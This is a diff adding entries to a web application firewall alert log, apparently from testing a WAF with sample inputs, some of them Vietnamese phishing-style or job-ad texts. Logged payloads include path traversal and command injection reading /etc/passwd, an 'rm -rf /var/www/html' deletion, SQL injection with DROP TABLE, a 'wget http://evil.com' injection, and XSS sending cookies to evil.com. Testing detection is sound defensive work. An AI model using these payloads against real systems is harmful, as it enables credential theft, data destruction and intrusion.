@@ -4,3 +4,52 @@
 [2026-04-25 16:05:40] [WAF_ALERT] Type: Path_Traversal | Payload: ../../../etc/passwd
 [2026-04-25 16:05:42] [WAF_ALERT] Type: OS_Command_Injection | Payload: hello; cat /etc/passwd
 [2026-04-28 10:34:45] [WAF_ALERT] Type: SQL_Injection | Payload: SELECT * FROM users
+[2026-04-28 11:36:38] [WAF_ALERT] Type: SQL_Injection | Payload: SELECT * FROM users
+[2026-04-28 23:01:28] [WAF_ALERT] Type: SQL_Injection | Payload: SELECT * FROM users
+[2026-04-29 09:22:45] [WAF_ALERT] Type: OWASP_RFI | Payload: https://sansorg.egnyte.com/dl/8VIrX1K87d/?
+[2026-04-29 09:23:01] [WAF_ALERT] Type: OWASP_RFI | Payload: https://sansorg.egnyte.com/dl/8VIrX1K87d/?
+[2026-04-29 09:26:24] [WAF_ALERT] Type: OWASP_RFI | Payload: file:///D:/vscode/index.html
+[2026-04-29 09:27:09] [WAF_ALERT] Type: OWASP_RFI | Payload: có công việc cần phỏng vấn mong bạn nhập cv vào đường link  này: https://github.com/coreruleset/coreruleset
+[2026-04-29 09:37:13] [WAF_ALERT] Type: OWASP_SQLi | Payload: SELECT * FROM
+[2026-04-29 09:37:15] [WAF_ALERT] Type: OWASP_SQLi | Payload: SELECT * FROM
+[2026-04-29 09:37:16] [WAF_ALERT] Type: OWASP_SQLi | Payload: SELECT * FROM
+[2026-04-29 09:37:20] [WAF_ALERT] Type: OWASP_SQLi | Payload: SELECT * FROM
+[2026-04-29 10:40:53] [WAF_ALERT] Type: SQL_Injection | Payload: SELECT * FROM users
+[2026-04-29 10:41:18] [WAF_ALERT] Type: SQL_Injection | Payload: SELECT * FROM users
+[2026-04-29 10:41:51] [WAF_ALERT] Type: SQL_Injection | Payload: SELECT * FROM users
+[2026-04-29 10:43:33] [WAF_ALERT] Type: OWASP_LFI | Payload: ../../../../etc/passwd%00
+[2026-04-29 10:43:43] [WAF_ALERT] Type: OWASP_LFI | Payload: ../../../../etc/passwd
+[2026-04-29 10:43:45] [WAF_ALERT] Type: OWASP_LFI | Payload: ../../../../etc/passwd
+[2026-04-29 10:43:45] [WAF_ALERT] Type: OWASP_LFI | Payload: ../../../../etc/passwd
+[2026-04-29 10:44:05] [WAF_ALERT] Type: OWASP_LFI | Payload: ../../../../etc/passwd%00 tưởng thế là hay
+[2026-04-29 10:45:10] [WAF_ALERT] Type: OWASP_LFI | Payload: ../../../../etc/passwd%00
+[2026-04-29 10:49:26] [WAF_ALERT] Type: OWASP_LFI | Payload: ../../../../etc/passwd%00
+[2026-04-29 10:49:46] [WAF_ALERT] Type: OWASP_LFI | Payload: ../../../../etc/passwd%00
+[2026-04-29 10:50:42] [WAF_ALERT] Type: OWASP_LFI | Payload: ../../../etc/passwd
+[2026-04-29 10:51:06] [WAF_ALERT] Type: OWASP_LFI | Payload: ../../../etc/passwd
+[2026-04-29 10:51:56] [WAF_ALERT] Type: OWASP_LFI | Payload: ../../../etc/passwd
+[2026-04-29 10:52:47] [WAF_ALERT] Type: OWASP_LFI | Payload: ../../../etc/passwd
+[2026-04-29 10:54:05] [WAF_ALERT] Type: OWASP_LFI | Payload: ../../../etc/passwd
+[2026-04-29 11:00:28] [WAF_ALERT] Type: OWASP_LFI | Payload: ../../../../etc/passwd%00
+[2026-04-29 11:03:05] [WAF_ALERT] Type: OWASP_RCE | Payload: chào bạn mình bên ngân hàng agribank. mời bạn ấn vào đường link này input | wget http://evil.com để cung cấp thông tin
+[2026-04-29 11:36:43] [WAF_ALERT] Type: INSECURE_HTTP_PROTOCOL | Payload: ấn vào đường link này cho tôi http://argibank.com.vn
+[2026-04-29 11:37:10] [WAF_ALERT] Type: SUSPICIOUS_TLD_PHISHING | Payload: ấn vào đường link này cho tôi https://argibank.casino
+[2026-04-29 11:38:55] [WAF_ALERT] Type: INSECURE_HTTP_PROTOCOL | Payload: ấn vào đường link này cho tôi select vào http://.com.vn
+[2026-04-29 11:39:03] [WAF_ALERT] Type: OWASP_LFI | Payload: ls -la; cat /etc/passwd && rm -rf /var/www/html
+[2026-04-29 11:39:08] [WAF_ALERT] Type: OWASP_SQLi | Payload: SELECT * FROM users WHERE id=1 OR 1=1--; DROP TABLE users;
+[2026-04-29 11:39:10] [WAF_ALERT] Type: OWASP_LFI | Payload: ls -la; cat /etc/passwd && rm -rf /var/www/html
+[2026-04-29 11:39:11] [WAF_ALERT] Type: OWASP_RCE | Payload: <script>alert('XSS')</script><img src=x onerror=fetch('//evil.com/'+document.cookie)>
+[2026-05-09 17:35:08] [WAF_ALERT] Type: OWASP_LFI | Payload: phân tích file:///D:/vscode/index.html
+[2026-05-09 19:35:30] [WAF_ALERT] Type: INSECURE_HTTP_PROTOCOL | Payload: Tuyển dụng nhân viên CSKH làm việc tại văn phòng. Mức lương khởi điểm 10-15 triệu. Yêu cầu có laptop cá nhân và biết sử ...
+[2026-05-09 19:36:22] [WAF_ALERT] Type: OWASP_SQLi | Payload: Công ty công nghệ ABC tuyển Thực tập sinh IT. Không yêu cầu kinh nghiệm, sẽ được đào tạo. Vui lòng điền họ tên vào hệ th...
+[2026-05-11 11:18:53] [WAF_ALERT] Type: INSECURE_HTTP_PROTOCOL | Payload: Tuyển dụng nhân viên CSKH làm việc tại văn phòng. Mức lương khởi điểm 10-15 triệu. Yêu cầu có laptop cá nhân và biết sử ...
+[2026-05-11 11:19:11] [WAF_ALERT] Type: OWASP_LFI | Payload: ls -la; cat /etc/passwd && rm -rf /var/www/html
+[2026-05-11 11:26:16] [WAF_ALERT] Type: INSECURE_HTTP_PROTOCOL | Payload: Tuyển dụng nhân viên CSKH làm việc tại văn phòng. Mức lương khởi điểm 10-15 triệu. Yêu cầu có laptop cá nhân và biết sử ...
+[2026-05-11 11:32:36] [WAF_ALERT] Type: INSECURE_HTTP_PROTOCOL | Payload: Tuyển dụng nhân viên CSKH làm việc tại văn phòng. Mức lương khởi điểm 10-15 triệu. Yêu cầu có laptop cá nhân và biết sử ...
+[2026-05-12 10:27:52] [WAF_ALERT] Type: INSECURE_HTTP_PROTOCOL | Payload: Tuyển dụng nhân viên CSKH làm việc tại văn phòng. Mức lương khởi điểm 10-15 triệu. Yêu cầu có laptop cá nhân và biết sử ...
+[2026-05-12 10:37:53] [WAF_ALERT] Type: OWASP_XSS | Payload: <script>alert('XSS')</script>
+[2026-05-12 11:24:51] [WAF_ALERT] Type: INSECURE_HTTP_PROTOCOL | Payload: Tuyển dụng nhân viên CSKH làm việc tại văn phòng. Mức lương khởi điểm 10-15 triệu. Yêu cầu có laptop cá nhân và biết sử ...
+[2026-05-12 11:35:30] [WAF_ALERT] Type: OWASP_SQLi | Payload: Công ty công nghệ ABC tuyển Thực tập sinh IT. Không yêu cầu kinh nghiệm, sẽ được đào tạo. Vui lòng điền họ tên vào hệ th...
+[2026-05-12 11:35:46] [WAF_ALERT] Type: INSECURE_HTTP_PROTOCOL | Payload: Tuyển dụng nhân viên CSKH làm việc tại văn phòng. Mức lương khởi điểm 10-15 triệu. Yêu cầu có laptop cá nhân và biết sử ...
+[2026-05-13 11:38:35] [WAF_ALERT] Type: OWASP_SQLi | Payload: Tuyển dụng nhân viên CSKH làm việc tại văn phòng. Mức lương khởi điểm 10-15 triệu. Yêu cầu có laptop cá nhân và biết sử ...
+[2026-05-13 11:41:25] [WAF_ALERT] Type: OWASP_RCE | Payload: Tớ vừa tìm thấy một khóa học lập trình Python cơ bản hoàn toàn miễn phí trên nền tảng của trường. Bạn nào quan tâm có th...
